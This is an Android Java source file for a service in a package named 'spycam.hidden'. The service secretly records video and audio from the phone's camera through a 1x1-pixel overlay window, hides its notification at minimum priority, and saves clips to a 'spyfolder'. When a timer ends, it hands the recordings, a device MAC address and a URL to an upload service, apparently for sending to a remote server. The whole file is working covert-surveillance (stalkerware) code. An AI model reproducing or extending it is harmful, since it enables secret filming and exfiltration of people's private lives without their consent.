package com.spycam.hidden.spycamhidden;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;

@SuppressWarnings("ALL")
public class BackgroundVideoRecorder extends Service implements SurfaceHolder.Callback {

    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private Camera camera = null;
    private MediaRecorder mediaRecorder = null;
    private String uid, url, macAddress;
    private long milliSeconds;

    @SuppressLint("RtlHardcoded")
    @Override
    public void onCreate() {

        // Start foreground service to avoid unexpected kill

//        startServiceOreoCondition();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startMyOwnForeground();
        } else {
            Notification notification = new Notification.Builder(this)
                    .setContentTitle("Recording Video")
                    .setContentText("")
//                    .setSmallIcon(R.mipmap.ic_launcher)
                    .build();
            startForeground(1234, notification);
        }
        // Create new SurfaceView, set its size to 1x1, move it to the top left
        // corner and set this service as a callback
        windowManager = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
        surfaceView = new SurfaceView(this);
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(1, 1,
                Build.VERSION.SDK_INT < Build.VERSION_CODES.O ?
                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY :
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT);
        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
        windowManager.addView(surfaceView, layoutParams);
        surfaceView.getHolder().addCallback(this);

    }


    private void startMyOwnForeground() {
        String NOTIFICATION_CHANNEL_ID = "com.example.simpleapp";
        String channelName = "My Background Service";
        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(chan);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
//                .setSmallIcon(R.drawable.icon_1)
                .setContentTitle("Recording Video")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(2, notification);
    }

    private void callService() {
        Intent intent = new Intent(getApplicationContext(), UploadFileService.class);
        intent.putExtra("uid", uid);
        intent.putExtra("url", url);
        intent.putExtra("macAddress", macAddress);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    boolean isFrontFacing = false;

    private Camera openFrontFacingCameraGingerbread() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
        }
        Camera cam;
        if (isFrontFacing && checkFrontCamera(BackgroundVideoRecorder.this)) {
            int cameraCount;
            cam = null;
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            cameraCount = Camera.getNumberOfCameras();
            for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
                Camera.getCameraInfo(camIdx, cameraInfo);
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    try {
                        cam = Camera.open(camIdx);
                    } catch (RuntimeException e) {
                        Log.e("Camera",
                                "Camera failed to open: " + e.getLocalizedMessage());

                    }
                }
            }
        } else {
            cam = Camera.open();
        }
        return cam;
    }

    private Camera.Size pictureSize;

    /*  private Camera.Size getBiggesttPictureSize(Camera.Parameters parameters) {
          Camera.Size result = null;

          for (Camera.Size size : parameters.getSupportedVideoSizes()) {
              if (result == null) {
                  result = size;
              } else {
                  int resultArea = result.width * result.height;
                  int newArea = size.width * size.height;

                  if (newArea > resultArea) {
                      result = size;
                  }
              }
          }

          return (result);
      }
  */
    // Method called right after Surface created (initializing and starting MediaRecorder)
    @Override
    public void surfaceCreated(SurfaceHolder surfaceHolder) {

        camera = openFrontFacingCameraGingerbread();

        mediaRecorder = new MediaRecorder();
        camera.unlock();


        mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
        mediaRecorder.setCamera(camera);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setProfile(CamcorderProfile.get
                (CamcorderProfile.QUALITY_LOW));


        File imagesFolder = new File(
                Environment.getExternalStorageDirectory(), "spyfolder");
        if (!imagesFolder.exists())
            imagesFolder.mkdirs(); // <----


        File image = new File(imagesFolder, System.currentTimeMillis() + "_" + Build.BRAND
                + ".mp4");  //file name + extension is .mp4


        mediaRecorder.setOutputFile(image.getAbsolutePath());

        try {
            mediaRecorder.prepare();
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            mediaRecorder.start();
        } catch (Exception e) {
            e.printStackTrace();
        }


    }

    // Stop recording and remove SurfaceView
    @Override
    public void onDestroy() {
        mediaRecorder.stop();
        mediaRecorder.reset();
        mediaRecorder.release();

        camera.lock();
        camera.release();

        windowManager.removeView(surfaceView);
    }

    private boolean checkFrontCamera(Context context) {
        if (context.getPackageManager().hasSystemFeature(
                PackageManager.FEATURE_CAMERA_FRONT)) {
            // this device has front camera
            Log.d("Test", "checkFrontCamera: ");
            return true;
        } else {
            // no front camera on this device
            return false;
        }
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Bundle extras = intent.getExtras();

//you can pass using intent,that which camera you want to use front/rear
        assert extras != null;
        isFrontFacing = extras.getBoolean("Front_Request");
        uid = extras.getString("uid");
        url = extras.getString("url");
        macAddress = extras.getString("macAddress");
        milliSeconds = extras.getLong("milliSeconds");

        new CountDownTimer(milliSeconds, 1000) {

            public void onTick(long millisUntilFinished) {
                Log.d("Test", "onTick: seconds remaining: " + millisUntilFinished / 1000);
                //here you can have your logic to set text to edittext
            }

            public void onFinish() {
                Log.d("Test", "onFinish: done");
                stopService(new Intent(getApplicationContext(), BackgroundVideoRecorder.class));
                callService();
            }

        }.start();
        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }

}

